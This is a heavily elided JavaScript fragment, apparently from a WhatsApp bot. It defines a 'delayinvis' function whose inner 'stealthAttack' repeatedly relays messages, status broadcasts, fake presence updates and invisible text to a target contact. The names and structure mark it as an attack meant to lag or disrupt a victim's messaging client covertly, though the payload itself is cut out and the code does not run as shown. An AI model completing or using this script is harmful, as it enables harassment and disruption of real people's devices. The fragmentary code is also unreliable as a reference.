// delay.js
async function delayinvis(alya, target) {
  ...
  const stealthAttack = async (count = 0) => {
    ...
    try {
      ...
      await alya.relayMessage(target, cleanMsg.message, {
        messageId: cleanMsg.key.id,
        participant: { jid: target }
      });
      
      await alya.relayMessage("status@broadcast", statusMsg.message, {
      ...
      const stealthTyping = async () => {
        for (let i = 0; i < 3; i++) {
          await alya.sendPresenceUpdate('available', target);
      ...
      await alya.sendMessage(target, invisibleText, {
        quoted: null
      });
